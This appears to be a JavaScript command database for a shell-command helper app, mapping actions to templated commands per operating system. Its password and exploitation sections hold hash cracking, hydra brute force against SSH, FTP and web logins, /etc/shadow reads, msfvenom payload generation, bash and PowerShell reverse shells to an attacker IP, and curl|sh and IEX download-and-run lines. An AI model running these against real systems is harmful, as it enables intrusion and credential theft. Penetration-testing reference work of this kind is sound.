                    windows: { cmd: "hashid \"{hash}\"", explanation: "Identifies the type of hash. Install with: pip install hashid" }
                }
            },
            johncrack: {
                label: "Crack password hash (wordlist)",
                parameters: [
                    { name: "hashfile", placeholder: "File containing hashes", required: true },
                    { name: "wordlist", placeholder: "Wordlist file path", required: true }
                ],
                commands: {
                    macos: { cmd: "john --wordlist={wordlist} {hashfile}", explanation: "Cracks hashes using John the Ripper. Install with: brew install john" },
                    linux: { cmd: "john --wordlist={wordlist} {hashfile}", explanation: "Cracks hashes using John the Ripper. Install with: apt install john" },
                    windows: { cmd: "john --wordlist={wordlist} {hashfile}", explanation: "Cracks hashes using John the Ripper." }
                }
            },
            hashcatcrack: {
                label: "GPU hash cracking",
                parameters: [
                    { name: "hashfile", placeholder: "File containing hashes", required: true },
                    { name: "mode", placeholder: "Hash type code (e.g., 0=MD5, 1000=NTLM)", required: true },
                    { name: "wordlist", placeholder: "Wordlist file path", required: true }
                ],
                commands: {
                    macos: { cmd: "hashcat -m {mode} {hashfile} {wordlist}", explanation: "GPU-accelerated hash cracking. Install with: brew install hashcat" },
                    linux: { cmd: "hashcat -m {mode} {hashfile} {wordlist}", explanation: "GPU-accelerated hash cracking. Install with: apt install hashcat" },
                    windows: { cmd: "hashcat -m {mode} {hashfile} {wordlist}", explanation: "GPU-accelerated hash cracking." }
                }
            },
            hydrassh: {
                label: "SSH brute force",
                parameters: [
                    { name: "target", placeholder: "Target host", required: true },
                    { name: "userlist", placeholder: "Username list file", required: true },
                    { name: "passlist", placeholder: "Password list file", required: true }
                ],
                commands: {
                    macos: { cmd: "hydra -L {userlist} -P {passlist} {target} ssh", explanation: "Brute forces SSH login. Install with: brew install hydra" },
                    linux: { cmd: "hydra -L {userlist} -P {passlist} {target} ssh", explanation: "Brute forces SSH login. Install with: apt install hydra" },
                    windows: { cmd: "hydra -L {userlist} -P {passlist} {target} ssh", explanation: "Brute forces SSH login." }
                }
            },
            hydraftp: {
                label: "FTP brute force",
                parameters: [
                    { name: "target", placeholder: "Target host", required: true },
                    { name: "userlist", placeholder: "Username list file", required: true },
                    { name: "passlist", placeholder: "Password list file", required: true }
                ],
                commands: {
                    macos: { cmd: "hydra -L {userlist} -P {passlist} {target} ftp", explanation: "Brute forces FTP login." },
                    linux: { cmd: "hydra -L {userlist} -P {passlist} {target} ftp", explanation: "Brute forces FTP login." },
                    windows: { cmd: "hydra -L {userlist} -P {passlist} {target} ftp", explanation: "Brute forces FTP login." }
                }
            },
            hydrahttp: {
                label: "HTTP form brute force",
                parameters: [
                    { name: "target", placeholder: "Target host", required: true },
                    { name: "userlist", placeholder: "Username list file", required: true },
                    { name: "passlist", placeholder: "Password list file", required: true },
                    { name: "form", placeholder: "Form path and params", required: true }
                ],
                commands: {
                    macos: { cmd: "hydra -L {userlist} -P {passlist} {target} http-post-form \"{form}\"", explanation: "Brute forces HTTP form login." },
                    linux: { cmd: "hydra -L {userlist} -P {passlist} {target} http-post-form \"{form}\"", explanation: "Brute forces HTTP form login." },
                    windows: { cmd: "hydra -L {userlist} -P {passlist} {target} http-post-form \"{form}\"", explanation: "Brute forces HTTP form login." }
                }
            },
            shadowfile: {
                label: "Extract shadow file hashes",
                parameters: [],
                commands: {
                    macos: { cmd: "sudo cat /etc/master.passwd", explanation: "Shows password hashes on macOS (requires root)." },
                    linux: { cmd: "sudo cat /etc/shadow", explanation: "Shows password hashes (requires root)." },
                    windows: { cmd: "echo 'Use mimikatz or secretsdump for Windows hashes'", explanation: "Windows stores hashes in SAM database." }
                }
            },
            passwdcheck: {
                label: "Check password in breach database",
                parameters: [
                    { name: "password", placeholder: "Password to check", required: true }
                ],
                commands: {
                    macos: { cmd: "echo -n \"{password}\" | shasum | cut -c1-5 | xargs -I {} curl -s 'https://api.pwnedpasswords.com/range/{}'", explanation: "Checks password against Have I Been Pwned (k-anonymity)." },
                    linux: { cmd: "echo -n \"{password}\" | sha1sum | cut -c1-5 | xargs -I {} curl -s 'https://api.pwnedpasswords.com/range/{}'", explanation: "Checks password against Have I Been Pwned (k-anonymity)." },
                    windows: { cmd: "powershell -Command \"$hash = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA1Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes('{password}'))) -replace '-',''; Invoke-WebRequest -Uri ('https://api.pwnedpasswords.com/range/' + $hash.Substring(0,5))\"", explanation: "Checks password against breach database." }
                }
            }
        }
    },

    // Exploitation & Post-Exploitation
    exploitation: {
        label: "Exploitation Tools",
        actions: {
            msfconsole: {
                label: "Start Metasploit console",
                parameters: [],
                commands: {
                    macos: { cmd: "msfconsole", explanation: "Starts the Metasploit Framework console. Install with: brew install metasploit" },
                    linux: { cmd: "msfconsole", explanation: "Starts the Metasploit Framework console. Install from rapid7 or apt." },
                    windows: { cmd: "msfconsole", explanation: "Starts the Metasploit Framework console." }
                }
            },
            msfvenom: {
                label: "Generate payload",
                parameters: [
                    { name: "payload", placeholder: "Payload type (e.g., windows/meterpreter/reverse_tcp)", required: true },
                    { name: "lhost", placeholder: "Local host IP", required: true },
                    { name: "lport", placeholder: "Local port", required: true },
                    { name: "format", placeholder: "Output format (exe, elf, raw)", required: true },
                    { name: "output", placeholder: "Output file path", required: true }
                ],
                commands: {
                    macos: { cmd: "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}", explanation: "Generates a Metasploit payload." },
                    linux: { cmd: "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}", explanation: "Generates a Metasploit payload." },
                    windows: { cmd: "msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {format} -o {output}", explanation: "Generates a Metasploit payload." }
                }
            },
            netcatlisten: {
                label: "Netcat listener",
                parameters: [
                    { name: "port", placeholder: "Port to listen on", required: true }
                ],
                commands: {
                    macos: { cmd: "nc -lvnp {port}", explanation: "Starts a netcat listener on the specified port." },
                    linux: { cmd: "nc -lvnp {port}", explanation: "Starts a netcat listener on the specified port." },
                    windows: { cmd: "ncat -lvnp {port}", explanation: "Starts a netcat listener on the specified port." }
                }
            },
            reverseshell: {
                label: "Bash reverse shell",
                parameters: [
                    { name: "ip", placeholder: "Attacker IP", required: true },
                    { name: "port", placeholder: "Attacker port", required: true }
                ],
                commands: {
                    macos: { cmd: "bash -i >& /dev/tcp/{ip}/{port} 0>&1", explanation: "Creates a bash reverse shell connection (for testing)." },
                    linux: { cmd: "bash -i >& /dev/tcp/{ip}/{port} 0>&1", explanation: "Creates a bash reverse shell connection (for testing)." },
                    windows: { cmd: "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"", explanation: "Creates a PowerShell reverse shell (for testing)." }
                }
            },
            searchsploit: {
                label: "Search for exploits",
                parameters: [
                    { name: "query", placeholder: "Search term (e.g., apache 2.4)", required: true }
                ],
                commands: {
                    macos: { cmd: "searchsploit {query}", explanation: "Searches ExploitDB for matching exploits. Install with: brew install exploitdb" },
                    linux: { cmd: "searchsploit {query}", explanation: "Searches ExploitDB for matching exploits. Install with: apt install exploitdb" },
                    windows: { cmd: "searchsploit {query}", explanation: "Searches ExploitDB for matching exploits." }
                }
            },
            enumlinux: {
                label: "Linux enumeration",
                parameters: [],
                commands: {
                    macos: { cmd: "echo 'Run on target Linux system'", explanation: "Download and run LinPEAS on the target." },
                    linux: { cmd: "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", explanation: "Downloads and runs LinPEAS for privilege escalation enumeration." },
                    windows: { cmd: "echo 'Use winPEAS for Windows enumeration'", explanation: "Download and run winPEAS on the target." }
                }
            },
            enumwindows: {
                label: "Windows enumeration",
                parameters: [],
                commands: {
                    macos: { cmd: "echo 'Run on target Windows system'", explanation: "Use winPEAS on the target Windows system." },
                    linux: { cmd: "echo 'Run on target Windows system'", explanation: "Use winPEAS on the target Windows system." },
                    windows: { cmd: "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\"", explanation: "Downloads and runs winPEAS for privilege escalation enumeration." }
                }
            },
            suidfind: {
                label: "Find SUID binaries",
                parameters: [],
                commands: {
                    macos: { cmd: "find / -perm -4000 -type f 2>/dev/null", explanation: "Finds files with SUID bit set (potential privilege escalation)." },
                    linux: { cmd: "find / -perm -4000 -type f 2>/dev/null", explanation: "Finds files with SUID bit set (potential privilege escalation)." },
                    windows: { cmd: "echo 'SUID is a Unix concept'", explanation: "Windows uses different permission mechanisms." }
                }
            },
            sudocheck: {
                label: "Check sudo permissions",
                parameters: [],
                commands: {
                    macos: { cmd: "sudo -l", explanation: "Lists commands the current user can run with sudo." },
                    linux: { cmd: "sudo -l", explanation: "Lists commands the current user can run with sudo." },
                    windows: { cmd: "whoami /priv", explanation: "Shows user privileges on Windows." }
                }
            }
        }
    },

    // Text Processing
    text: {
        label: "Text Processing",
        actions: {
            head: {
                label: "View first lines of file",
                parameters: [
                    { name: "lines", placeholder: "Number of lines (e.g., 10)", required: true },
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "head -n {lines} {file}", explanation: "Displays the first N lines of a file." },
                    linux: { cmd: "head -n {lines} {file}", explanation: "Displays the first N lines of a file." },
                    windows: { cmd: "Get-Content {file} -Head {lines}", explanation: "Shows the first N lines using PowerShell." }
                }
            },
            tail: {
                label: "View last lines of file",
                parameters: [
                    { name: "lines", placeholder: "Number of lines (e.g., 10)", required: true },
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "tail -n {lines} {file}", explanation: "Displays the last N lines of a file." },
                    linux: { cmd: "tail -n {lines} {file}", explanation: "Displays the last N lines of a file." },
                    windows: { cmd: "Get-Content {file} -Tail {lines}", explanation: "Shows the last N lines using PowerShell." }
                }
            },
            wc: {
                label: "Count lines/words/chars",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "wc {file}", explanation: "Counts lines, words, and characters in a file." },
                    linux: { cmd: "wc {file}", explanation: "Counts lines, words, and characters in a file." },
                    windows: { cmd: "Get-Content {file} | Measure-Object -Line -Word -Character", explanation: "Counts using PowerShell." }
                }
            },
            sort: {
                label: "Sort file contents",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "sort {file}", explanation: "Sorts lines of the file alphabetically." },
                    linux: { cmd: "sort {file}", explanation: "Sorts lines of the file alphabetically." },
                    windows: { cmd: "sort {file}", explanation: "Sorts lines of the file." }
                }
            },
            unique: {
                label: "Remove duplicate lines",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "sort {file} | uniq", explanation: "Removes duplicate adjacent lines (file must be sorted)." },
                    linux: { cmd: "sort {file} | uniq", explanation: "Removes duplicate adjacent lines (file must be sorted)." },
                    windows: { cmd: "Get-Content {file} | Sort-Object -Unique", explanation: "Removes duplicates using PowerShell." }
                }
            },
            replace: {
                label: "Find and replace text",
                parameters: [
                    { name: "find", placeholder: "Text to find", required: true },
                    { name: "replace", placeholder: "Replacement text", required: true },
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "sed -i '' 's/{find}/{replace}/g' {file}", explanation: "Replaces all occurrences of text in the file." },
                    linux: { cmd: "sed -i 's/{find}/{replace}/g' {file}", explanation: "Replaces all occurrences of text in the file." },
                    windows: { cmd: "(Get-Content {file}) -replace '{find}', '{replace}' | Set-Content {file}", explanation: "Replaces text using PowerShell." }
                }
            }
        }
    }
};

// Export for use in app.js
if (typeof module !== 'undefined' && module.exports) {
    module.exports = commandDatabase;
}
